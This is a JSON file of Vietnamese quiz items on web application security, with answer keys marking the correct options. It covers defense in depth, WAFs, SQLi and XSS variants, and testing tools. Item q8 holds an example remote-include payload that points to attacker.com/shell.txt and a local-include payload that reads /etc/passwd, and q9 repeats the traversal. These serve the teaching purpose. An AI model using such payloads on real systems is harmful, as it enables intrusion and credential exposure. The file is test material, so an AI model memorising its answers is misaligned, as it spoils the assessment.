@@ -1,0 +1,1198 @@
+[
+	{
+		"question_id": "bm-m4-q1",
+		"question_text": "Mô hình Defense in Depth cho ứng dụng web có những lớp nào?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Network perimeter: Firewall, VPN",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Middleware: IDS/IPS",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Application: WAF (chặn SQLi, XSS, CSRF)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Database: mã hóa, phân quyền, backup",
+				"is_correct": true
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q2",
+		"question_text": "Firewall (FW) đặt ở vị trí nào trong kiến trúc bảo mật web?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Biên mạng (giữa Internet và DMZ), lọc gói theo IP, cổng, giao thức",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Bên trong hệ quản trị cơ sở dữ liệu",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Trên máy tính người dùng cuối",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Sau Web Server, phân tích HTTP",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q3",
+		"question_text": "WAF phân tích lưu lượng gì và ngăn chặn tấn công nào?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "HTTP/HTTPS, ngăn SQLi, XSS, RFI, LFI",
+				"is_correct": true
+			},
+			{
+				"answer_text": "IP/port, ngăn truy cập mạng",
+				"is_correct": false
+			},
+			{
+				"answer_text": "AES, mã hóa dữ liệu",
+				"is_correct": false
+			},
+			{
+				"answer_text": "DNS, phân giải tên miền",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q4",
+		"question_text": "Blind SQL Injection khác SQLi thông thường ở điểm nào?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Ứng dụng không hiển thị lỗi SQL, kẻ tấn công suy đoán dữ liệu dựa vào phản hồi đúng/sai",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Hiển thị toàn bộ lỗi SQL trên màn hình",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Chỉ hoạt động với NoSQL",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Không thể trích xuất dữ liệu",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q5",
+		"question_text": "Time-based SQL Injection phát hiện lỗ hổng bằng cách nào?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Chèn lệnh SLEEP(5), nếu server phản hồi chậm chứng tỏ câu lệnh được thực thi",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Đọc thông báo lỗi SQL",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Đánh cắp cookie qua JavaScript",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Gửi lượng lớn request DDoS",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q6",
+		"question_text": "Stored XSS nguy hiểm như thế nào?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Script độc hại lưu trong CSDL, tất cả người dùng truy cập trang đều bị nhiễm",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Chỉ thực thi một lần rồi biến mất",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Chỉ ảnh hưởng người chèn script",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Không thể đánh cắp session",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q7",
+		"question_text": "DOM-based XSS có đặc điểm gì?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Script thực thi hoàn toàn ở client, khai thác cách JavaScript thao tác với DOM",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Script lưu trong CSDL server",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Yêu cầu server phản hồi lỗi SQL",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Chỉ hoạt động với FTP",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q8",
+		"question_text": "RFI và LFI lần lượt là gì?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "RFI: chèn file từ bên ngoài để server thực thi (?page=http://attacker.com/shell.txt); LFI: include file cục bộ (?page=../../etc/passwd)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "RFI mã hóa dữ liệu, LFI giải mã",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Cả hai đều nghe lén gói tin",
+				"is_correct": false
+			},
+			{
+				"answer_text": "RFI và LFI là cùng một kỹ thuật",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q9",
+		"question_text": "Directory Traversal khai thác bằng cách nào?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Dùng ../ để truy cập thư mục nhạy cảm ngoài phạm vi (?file=../../etc/passwd)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Chèn mã SQL vào ô đăng nhập",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Gửi email giả mạo ngân hàng",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Mã hóa dữ liệu bằng AES",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q10",
+		"question_text": "Path Disclosure xảy ra khi nào?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Ứng dụng vô tình hiển thị đường dẫn file trên server (lỗi PHP, log debug)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Mã hóa dữ liệu AES-256",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Chèn mã SQL",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Gửi DDoS",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q11",
+		"question_text": "Tấn công GraphQL có thể thực hiện bằng cách nào?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Introspection query để dò toàn bộ schema",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Batching attack gửi nhiều query một lúc để khai thác dữ liệu",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Brute force token JWT",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Bypass rate limit qua REST",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q12",
+		"question_text": "REST API dễ bị tấn công nào nếu không giới hạn request hoặc xác thực kém?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Brute force token JWT",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Bypass rate limit",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Mã hóa AES-256",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Phân giải DNS",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q13",
+		"question_text": "CSP (Content Security Policy) có tác dụng gì?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Chỉ định nguồn nội dung trình duyệt được phép tải (script, style, iframe)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Ngăn chặn XSS từ chối script nguồn không tin cậy",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Giảm Clickjacking và Data Injection",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Mã hóa dữ liệu trên ổ cứng",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q14",
+		"question_text": "Thuộc tính Secure Cookie nào ngăn JavaScript truy cập cookie?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "HttpOnly",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Secure",
+				"is_correct": false
+			},
+			{
+				"answer_text": "SameSite",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Path",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q15",
+		"question_text": "Thuộc tính SameSite của cookie có tác dụng gì?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Hạn chế cookie gửi trong request cross-site, giảm CSRF",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Ngăn JavaScript đọc cookie",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Chỉ gửi cookie qua HTTPS",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Mã hóa cookie bằng AES",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q16",
+		"question_text": "OAuth 2.0 và JWT dùng để làm gì trong bảo mật API?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "OAuth 2.0: chuẩn xác thực ủy quyền (login bên thứ 3); JWT: token gọn nhẹ, dữ liệu được ký số",
+				"is_correct": true
+			},
+			{
+				"answer_text": "OAuth 2.0: mã hóa AES; JWT: quét lỗ hổng",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Cả hai đều là công cụ DDoS",
+				"is_correct": false
+			},
+			{
+				"answer_text": "OAuth 2.0: tường lửa; JWT: diệt virus",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q17",
+		"question_text": "WAF thế hệ mới (AI/ML) khác WAF truyền thống ở điểm nào?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Truyền thống dựa rule/signature; AI/ML học hành vi bất thường, phát hiện tấn công zero-day",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Truyền thống phát hiện zero-day tốt hơn",
+				"is_correct": false
+			},
+			{
+				"answer_text": "AI/ML chỉ hoạt động với SQLi",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Không có khác biệt",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q18",
+		"question_text": "OWASP ZAP là công cụ gì?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Mã nguồn mở do OWASP phát triển, quét web phát hiện SQLi/XSS, proxy trung gian",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Công cụ thương mại chỉ có bản trả phí",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Công cụ quét web server",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Phần mềm diệt virus",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q19",
+		"question_text": "Burp Suite có những chức năng chính nào?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Intercept proxy: phân tích, chỉnh sửa request/response",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Scanner: tự động dò lỗ hổng",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Intruder: brute force, fuzzing",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Mã hóa dữ liệu AES-256",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q20",
+		"question_text": "sqlmap có khả năng gì?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Tự động phát hiện SQL Injection",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Trích xuất database, bảng, cột",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Thử error-based, blind, time-based SQLi",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Quét cổng mạng",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q21",
+		"question_text": "Nikto chuyên dùng để làm gì?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Quét Web Server phát hiện cấu hình sai, file/dir ẩn, phiên bản server dễ bị tấn công",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Tự động khai thác SQL Injection",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Gửi DDoS",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Mã hóa dữ liệu",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q22",
+		"question_text": "SAST và DAST khác nhau ở điểm nào?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "SAST quét mã nguồn (chưa chạy ứng dụng); DAST quét ứng dụng đang chạy để phát hiện lỗ hổng",
+				"is_correct": true
+			},
+			{
+				"answer_text": "SAST quét runtime; DAST quét mã nguồn",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Cả hai giống hệt nhau",
+				"is_correct": false
+			},
+			{
+				"answer_text": "SAST chỉ dùng cho mạng, DAST cho database",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q23",
+		"question_text": "SonarQube, Checkmarx là ví dụ cho công cụ nào?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "SAST (Static Application Security Testing)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "DAST",
+				"is_correct": false
+			},
+			{
+				"answer_text": "WAF",
+				"is_correct": false
+			},
+			{
+				"answer_text": "IDS/IPS",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q24",
+		"question_text": "Secure SDLC đưa bảo mật vào những giai đoạn nào?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Phân tích yêu cầu (xác thực, phân quyền, mã hóa)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Thiết kế (defense in depth, least privilege)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Lập trình (coding standard OWASP, CERT)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Kiểm thử (SAST, DAST, pentest) và vận hành",
+				"is_correct": true
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q25",
+		"question_text": "DevSecOps triển khai qua những cách nào?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Security-as-Code: tự động SAST/DAST/SCA trong CI/CD pipeline",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Shift-left security: kiểm tra bảo mật sớm từ giai đoạn coding",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Continuous Monitoring: giám sát liên tục production",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Bảo mật chỉ ở giai đoạn cuối trước phát hành",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q26",
+		"question_text": "Mô hình STRIDE trong Threat Modeling gồm những mối đe dọa nào?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Spoofing (giả mạo danh tính)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Tampering (sửa đổi dữ liệu)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Information Disclosure (rò rỉ thông tin)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Elevation of Privilege (leo thang đặc quyền)",
+				"is_correct": true
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q27",
+		"question_text": "Patch Management đúng quy trình gồm những bước nào?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Theo dõi cảnh báo bảo mật từ nhà cung cấp",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Kiểm thử bản vá trong staging trước khi áp dụng production",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Tự động hóa với Dependabot, OWASP Dependency-Check",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Áp dụng bản vá ngay lên production không kiểm thử",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q28",
+		"question_text": "Lỗ hổng Log4j, OpenSSL thuộc vấn đề gì cần quản lý bản vá?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Lỗ hổng trong dependency/thư viện bên thứ ba",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Lỗ hổng do lập trình viên viết",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Lỗ hổng phần cứng",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Lỗ hổng cấu hình mạng",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q29",
+		"question_text": "Prepared Statement chống SQL Injection bằng cơ chế nào?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Dữ liệu đầu vào được ràng buộc như tham số, không thể chèn mã SQL",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Ghép chuỗi SQL trực tiếp từ input",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Mã hóa câu lệnh SQL bằng AES",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Xóa ký tự đặc biệt trong kết quả",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q30",
+		"question_text": "ORM Framework (Hibernate, Entity Framework, Django ORM) giúp chống SQLi như thế nào?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Tự động escape dữ liệu và áp dụng parameterized query",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Ghép chuỗi SQL trực tiếp",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Mã hóa dữ liệu AES",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Tắt kết nối database",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q31",
+		"question_text": "Nguyên tắc Least Privilege cho tài khoản DB ứng dụng nên như thế nào?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Không có quyền DROP, ALTER, GRANT để giảm thiệt hại nếu bị khai thác",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Cấp quyền root/full access",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Chỉ cấp quyền ghi và xóa toàn bộ bảng",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Không cần phân quyền vì đã có WAF",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q32",
+		"question_text": "Escape Output chống XSS cần làm gì theo ngữ cảnh?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "HTML context: &lt; &gt; &amp;",
+				"is_correct": true
+			},
+			{
+				"answer_text": "JavaScript context: escape dấu nháy \" '",
+				"is_correct": true
+			},
+			{
+				"answer_text": "URL context: encodeURIComponent()",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Mã hóa AES-256",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q33",
+		"question_text": "Những framework nào có sẵn cơ chế chống XSS nếu tuân thủ coding convention?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Angular",
+				"is_correct": true
+			},
+			{
+				"answer_text": "React",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Django, Spring Security",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Notepad",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q34",
+		"question_text": "Trong quy trình kiểm tra bảo mật, Black-box testing là gì?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Giả lập hacker bên ngoài, không có thông tin hệ thống",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Có toàn bộ mã nguồn, cấu hình",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Kết hợp có thông tin và giả lập tấn công",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Chỉ kiểm tra giao diện",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q35",
+		"question_text": "Ưu điểm của quét lỗ hổng tự động là gì?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Nhanh, bao phủ rộng, phát hiện lỗ hổng phổ biến",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Phát hiện được mọi lỗ hổng logic",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Không bao giờ báo false positive",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Không cần kiểm thử thủ công lại",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q36",
+		"question_text": "Kiểm tra lỗi logic nghiệp vụ (Business Logic Flaws) bao gồm ví dụ nào?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Bỏ qua bước thanh toán nhưng vẫn tạo đơn hàng",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Thay đổi giá trị sản phẩm trong request (giảm giá trị)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Sửa role từ 'user' thành 'admin' trong request/session",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Mã hóa dữ liệu bằng TLS",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q37",
+		"question_text": "Replay Attack là gì?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Gửi lại cùng một request nhiều lần để xem có xử lý trùng (double spending)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Chèn mã SQL vào form",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Đánh cắp cookie qua XSS",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Mã hóa dữ liệu AES",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q38",
+		"question_text": "Phân tích Session & Cookie kiểm tra những gì?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Cookie có flag HttpOnly, Secure, SameSite không",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Session ID có thể dự đoán được không",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Session có hủy khi logout không, thử session fixation",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Mã hóa dữ liệu AES-256",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q39",
+		"question_text": "Phân tích Header HTTP kiểm tra những gì?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Có bật CSP (Content Security Policy) không",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Có bật X-Frame-Options chống clickjacking không",
+				"is_correct": true
+			},
+			{
+				"answer_text": "CORS có bị mở quá rộng (Access-Control-Allow-Origin: *) không",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Mã hóa AES của server",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q40",
+		"question_text": "Quy trình kiểm tra bảo mật ứng dụng web đúng theo thứ tự là gì?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Lập kế hoạch → Quét tự động → Kiểm thử thủ công → Báo cáo & khắc phục",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Báo cáo → Kiểm thử thủ công → Quét tự động → Lập kế hoạch",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Quét tự động → Lập kế hoạch → Báo cáo → Kiểm thử thủ công",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Kiểm thử thủ công → Báo cáo → Quét tự động → Lập kế hoạch",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q41",
+		"question_text": "Báo cáo kiểm tra bảo mật nên gồm những gì?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Mô tả lỗ hổng (mức độ High/Medium/Low)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Minh chứng (screenshot, request/response)",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Kịch bản tấn công có thể xảy ra",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Đề xuất giải pháp khắc phục",
+				"is_correct": true
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q42",
+		"question_text": "Vì sao Defense in Depth quan trọng hơn một công nghệ bảo mật đơn lẻ như Firewall?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Hacker có thể vượt 1 lớp nhưng khó vượt nhiều lớp, giảm rủi ro single point of failure",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Firewall không có tác dụng gì",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Chỉ cần Firewall là đủ an toàn",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Defense in Depth đắt hơn nhưng không hiệu quả",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q43",
+		"question_text": "Khi nào nên dùng WAF thế hệ mới tích hợp AI/ML thay vì WAF truyền thống?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Khi đối phó tấn công mới, zero-day, hoặc lưu lượng phức tạp",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Khi chỉ cần chặn tấn công phổ biến theo rule",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Khi không có ngân sách",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Không bao giờ nên dùng AI/ML",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q44",
+		"question_text": "Nếu hạn chế tài nguyên chỉ chọn 2 công cụ kiểm thử web, lựa chọn hợp lý là gì?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Burp Suite (manual/proxy) + OWASP ZAP (scanner), cân bằng tự động và thủ công",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Chỉ sqlmap và Nikto",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Chỉ Nmap",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Không cần công cụ",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q45",
+		"question_text": "Trong thương mại điện tử, SQL Injection hay XSS nguy hiểm hơn và vì sao?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "SQLi nguy hiểm hơn vì đánh cắp DB (thông tin khách hàng, thẻ tín dụng), thiệt hại tài chính/pháp lý lớn",
+				"is_correct": true
+			},
+			{
+				"answer_text": "XSS nguy hiểm hơn vì mã hóa dữ liệu",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Cả hai không gây hậu quả",
+				"is_correct": false
+			},
+			{
+				"answer_text": "XSS nguy hiểm hơn vì xóa toàn bộ database",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q46",
+		"question_text": "Nếu chỉ có firewall mà website bị DDoS và hacker khai thác lỗ hổng ứng dụng, chuyện gì xảy ra?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Hacker qua mặt bằng cách khai thác ứng dụng, hệ thống vẫn bị xâm nhập",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Hệ thống an toàn hoàn toàn",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Firewall chặn được mọi tấn công ứng dụng",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Không có chuyện gì xảy ra",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q47",
+		"question_text": "Vì sao WAF AI/ML phát hiện được payload mới mà WAF rule-based không nhận ra?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Không phụ thuộc rule cứng, nhận diện mẫu hành vi bất thường để phát hiện tấn công zero-day",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Có nhiều rule hơn WAF truyền thống",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Mã hóa dữ liệu AES",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Tắt giám sát",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q48",
+		"question_text": "DevSecOps giúp ích gì khi bản cập nhật website chưa kiểm thử bảo mật?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Tự động quét bảo mật trong CI/CD pipeline, phát hiện sớm XSS trước khi code ra môi trường thật",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Tăng tốc độ release bỏ qua bảo mật",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Xóa bỏ nhu cầu kiểm thử",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Chỉ phát hiện lỗi sau khi bị tấn công",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q49",
+		"question_text": "Code Review bảo mật tập trung vào những lỗi phổ biến nào?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "SQL Injection",
+				"is_correct": true
+			},
+			{
+				"answer_text": "XSS",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Xử lý session, xác thực",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Mã hóa AES-256",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q50",
+		"question_text": "Nmap NSE (Nmap Scripting Engine) hỗ trợ kiểm thử gì?",
+		"question_type": "multiple_answer_question",
+		"answers": [
+			{
+				"answer_text": "Kiểm thử SQLi, XSS",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Cấu hình SSL/TLS",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Quét cổng, phát hiện dịch vụ và phiên bản",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Mã hóa dữ liệu AES",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q51",
+		"question_text": "WAF là lớp phòng thủ bổ sung hay thay thế code an toàn?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Lớp phòng thủ bổ sung, không thay thế code an toàn",
+				"is_correct": true
+			},
+			{
+				"answer_text": "Thay thế hoàn toàn code an toàn",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Không có tác dụng",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Chỉ cần WAF không cần code",
+				"is_correct": false
+			}
+		]
+	},
+	{
+		"question_id": "bm-m4-q52",
+		"question_text": "Theo kết luận, bảo mật ứng dụng Web là gì?",
+		"question_type": "single_answer_question",
+		"answers": [
+			{
+				"answer_text": "Quy trình liên tục, kết hợp công nghệ, con người và quy trình quản lý",
+				"is_correct": true
+			},
